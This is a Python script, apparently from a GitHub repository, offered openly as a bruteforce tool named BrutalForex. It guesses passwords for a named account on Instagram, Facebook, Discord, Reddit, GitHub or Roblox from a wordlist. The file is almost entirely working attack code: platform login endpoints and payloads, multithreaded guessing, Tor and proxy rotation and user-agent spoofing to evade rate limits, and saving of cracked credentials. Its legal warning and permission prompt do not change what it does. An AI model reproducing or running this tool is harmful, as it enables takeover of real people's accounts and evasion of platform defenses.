#!/usr/bin/env python3
# BrutalForex v6.3 - Multi-Platform Bruteforce Tool
# Platforms: Instagram, Facebook, Discord, Reddit, GitHub, Roblox
# Features: Tor/Proxy support, Platform-specific handling, Smart rate limiting
# Author: voltsparx
# Contact: voltsparx@gmail.com

import os
import sys
import time
import random
import json
import argparse
import threading
import requests
from concurrent.futures import ThreadPoolExecutor

# ===== COLOR ENGINE =====
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ===== TOR/PROXY CONFIG =====
TOR_PROXY = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

def load_proxies():
    """Load proxies from proxies.txt or use Tor"""
    if os.path.exists('proxies.txt'):
        with open('proxies.txt') as f:
            return [line.strip() for line in f if line.strip()]
    return None

def check_tor():
    try:
        print(f"{Colors.YELLOW}[*] Verifying Tor connection...{Colors.END}")
        normal_ip = requests.get('https://api.ipify.org', timeout=10).text
        tor_ip = requests.get('https://api.ipify.org', proxies=TOR_PROXY, timeout=10).text
        if normal_ip != tor_ip:
            print(f"{Colors.GREEN}[+] Tor connected! IP: {tor_ip}{Colors.END}")
            return True
        print(f"{Colors.RED}[-] Tor check failed (IP unchanged){Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[-] Tor error: {str(e)}{Colors.END}")
    return False

# ===== PLATFORM CONFIGURATIONS =====
PLATFORMS = {
    'instagram': {
        'name': 'Instagram',
        'color': Colors.MAGENTA,
        'login_url': 'https://www.instagram.com/accounts/login/ajax/',
        'method': 'POST',
        'headers': {
            'X-IG-App-ID': '936619743392459',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'en-US,en;q=0.9'
        },
        'pre_request': lambda s: s.get('https://www.instagram.com/accounts/login/'),
        'payload': lambda u,p: {
            'username': u,
            'enc_password': f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{p}",
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        },
        'success_check': lambda r: r.json().get('authenticated', False),
        'delay': (0.5, 2.0)  # Min/Max delay between attempts
    },
    'facebook': {
        'name': 'Facebook',
        'color': Colors.BLUE,
        'login_url': 'https://www.facebook.com/login.php',
        'method': 'POST',
        'headers': {
            'Origin': 'https://www.facebook.com',
            'Accept-Language': 'en-US,en;q=0.9'
        },
        'payload': lambda u,p: {
            'email': u,
            'pass': p,
            'login': 'Log In'
        },
        'success_check': lambda r: 'login_attempt' not in r.text,
        'delay': (1.0, 3.0)
    },
    'discord': {
        'name': 'Discord',
        'color': Colors.CYAN,
        'login_url': 'https://discord.com/api/v9/auth/login',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9'
        },
        'pre_request': lambda s: s.headers.update({
            'X-Fingerprint': s.get('https://discord.com/api/v9/experiments').json().get('fingerprint', '')
        }),
        'payload': lambda u,p: {'login': u, 'password': p},
        'success_check': lambda r: r.status_code == 200 and 'token' in r.json(),
        'delay': (1.0, 3.0)
    },
    'reddit': {
        'name': 'Reddit',
        'color': Colors.RED,
        'login_url': 'https://www.reddit.com/login',
        'method': 'POST',
        'headers': {
            'Origin': 'https://www.reddit.com',
            'Accept-Language': 'en-US,en;q=0.9'
        },
        'payload': lambda u,p: {
            'op': 'login',
            'user': u,
            'passwd': p
        },
        'success_check': lambda r: r.json().get('success', False),
        'delay': (0.7, 2.5)
    },
    'github': {
        'name': 'GitHub',
        'color': Colors.WHITE,
        'login_url': 'https://github.com/session',
        'method': 'POST',
        'headers': {
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9'
        },
        'pre_request': lambda s: s.get('https://github.com/login'),
        'payload': lambda u,p: {
            'login': u,
            'password': p
        },
        'success_check': lambda r: 'logged_in' in r.cookies,
        'delay': (1.0, 4.0)  # GitHub has strict rate limits
    },
    'roblox': {
        'name': 'Roblox',
        'color': Colors.WHITE,
        'login_url': 'https://auth.roblox.com/v2/login',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9'
        },
        'payload': lambda u,p: {
            'ctype': 'Username',
            'cvalue': u,
            'password': p
        },
        'success_check': lambda r: r.status_code == 200 and 'user' in r.json(),
        'delay': (0.5, 2.0)
    }
}

# ===== MAIN ENGINE =====
class BrutalForex:
    def __init__(self, use_tor=False, use_proxies=False):
        self.found = threading.Event()
        self.attempts = 0
        self.session = requests.Session()
        self.proxies = load_proxies() if use_proxies else None
        self.current_proxy = None
        self.use_tor = use_tor
        
        if use_tor and check_tor():
            self.session.proxies = TOR_PROXY
        
        self._rotate_user_agent()

    def _rotate_user_agent(self):
        agents = [
            # Chrome
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80,110)}.0.{random.randint(1000,9999)}.{random.randint(100,999)} Safari/537.36",
            # Firefox
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(70,100)}.0) Gecko/20100101 Firefox/{random.randint(70,100)}.0",
            # Safari
            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(12,15)}.{random.randint(0,5)} Safari/605.1.15"
        ]
        self.session.headers.update({
            'User-Agent': random.choice(agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })

    def _rotate_proxy(self):
        if self.proxies:
            self.current_proxy = random.choice(self.proxies)
            self.session.proxies = {
                'http': self.current_proxy,
                'https': self.current_proxy
            }

    def _load_wordlist(self, path):
        try:
            if not os.path.exists(path):
                raise FileNotFoundError(f"Wordlist not found at {path}")
            
            if os.path.getsize(path) == 0:
                raise ValueError("Wordlist file is empty")
                
            with open(path, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
                if not passwords:
                    raise ValueError("No valid passwords in wordlist")
                return passwords
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {str(e)}{Colors.END}")
            sys.exit(1)

    def _platform_attack(self, platform, username, password):
        config = PLATFORMS.get(platform)
        if not config:
            return False

        try:
            # Rotate anonymity features
            self._rotate_user_agent()
            if self.proxies:
                self._rotate_proxy()
            
            # Platform-specific setup
            if 'pre_request' in config:
                config['pre_request'](self.session)
            
            # Prepare request
            response = self.session.request(
                config['method'],
                config['login_url'],
                headers=config['headers'],
                json=config['payload'](username, password) if config['method'] == 'POST' and 'application/json' in config['headers'].get('Content-Type', '') else None,
                data=config['payload'](username, password) if config['method'] == 'POST' and not ('application/json' in config['headers'].get('Content-Type', '')) else None,
                timeout=15
            )
            
            return config['success_check'](response)
            
        except requests.RequestException:
            return False

    def run_attack(self, platform, username, wordlist_path, max_threads=50):
        passwords = self._load_wordlist(wordlist_path)
        config = PLATFORMS[platform]
        
        print(f"\n{config['color']}[*] Attacking {config['name']} account: {username}{Colors.END}")
        print(f"{config['color']}[*] Loaded {len(passwords)} passwords | Threads: {max_threads}{Colors.END}")
        if self.use_tor or self.proxies:
            print(f"{config['color']}[*] Anonymity: {'Tor' if self.use_tor else 'Proxies'}{Colors.END}")
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            for password in passwords:
                if self.found.is_set():
                    break
                
                executor.submit(self._attempt_login, platform, username, password)
                time.sleep(random.uniform(*config['delay']))  # Platform-specific delay
        
        if not self.found.is_set():
            print(f"\n{Colors.RED}[-] Failed after {self.attempts} attempts ({time.time()-start_time:.2f}s){Colors.END}")

    def _attempt_login(self, platform, username, password):
        if self.found.is_set():
            return

        with threading.Lock():
            self.attempts += 1
            if self.attempts % 100 == 0:
                print(f"{Colors.YELLOW}[*] Attempts: {self.attempts}{Colors.END}", end='\r')
            
        if self._platform_attack(platform, username, password):
            self.found.set()
            print(f"\n{Colors.GREEN}[+] Success! Password: {password}{Colors.END}")
            self._save_results(platform, username, password)

    def _save_results(self, platform, username, password):
        os.makedirs("results", exist_ok=True)
        with open(f"results/{platform}_{username}.txt", "w") as f:
            f.write(f"Platform: {PLATFORMS[platform]['name']}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
            f.write(f"Attempts: {self.attempts}\n")
            f.write(f"Timestamp: {time.ctime()}\n")

# ===== COMMAND LINE INTERFACE =====
def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = rf"""{Colors.BLUE}
|=====================================================================|
|        ____             _        _ _____                            |
|       | __ ) _ __ _   _| |_ __ _| |  ___|__  _ __ _____  __         |
|       |  _ \| '__| | | | __/ _` | | |_ / _ \| '__/ _ \ \/ /         |
|       | |_) | |  | |_| | || (_| | |  _| (_) | | |  __/>  <          |
|       |____/|_|   \__,_|\__\__,_|_|_|  \___/|_|  \___/_/\_\         |
|                                                             ver-6.3 |
|=====================================================================|    {Colors.END}"""
    print(banner)
    print(f"{Colors.BOLD}BrutalForex - Multi-Platform Bruteforce Tool{Colors.END}")
    print(f"{Colors.YELLOW}Author: voltsparx | Contact: voltsparx@gmail.com{Colors.END}")
    print(f"{Colors.CYAN}Repo: https://github.com/voltsparx/BrutalForex{Colors.END}")
    print(f"{Colors.CYAN}Version: v6.3{Colors.END}")
    print(f"\n{Colors.BOLD}Supported Platforms:{Colors.END}")
    for platform, config in PLATFORMS.items():
        print(f"  {config['color']}{platform.ljust(10)}{Colors.END} - {config['name']}")
    print(f"\n{Colors.RED}LEGAL WARNING: For authorized testing only. Unauthorized access is illegal.{Colors.END}")

def main():
    print_banner()
    
    if input(f"\n{Colors.YELLOW}[?] Confirm you have permission to test this account (y/N): {Colors.END}").lower() != 'y':
        sys.exit(0)

    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--platform", required=True, 
                      choices=PLATFORMS.keys(),
                      help="Target platform")
    parser.add_argument("-u", "--username", required=True, 
                      help="Target username/email")
    parser.add_argument("-w", "--wordlist", required=True,
                      help="Path to password wordlist")
    parser.add_argument("-t", "--threads", type=int, default=50,
                      help="Number of threads (10-100)")
    parser.add_argument("--tor", action="store_true",
                      help="Use Tor for anonymity")
    parser.add_argument("--proxies", action="store_true",
                      help="Use proxies from proxies.txt")
    args = parser.parse_args()

    if args.tor and args.proxies:
        print(f"{Colors.RED}[!] Cannot use both Tor and proxies simultaneously{Colors.END}")
        sys.exit(1)

    bf = BrutalForex(use_tor=args.tor, use_proxies=args.proxies)
    bf.run_attack(args.platform, args.username, args.wordlist, args.threads)

if __name__ == "__main__":
    main()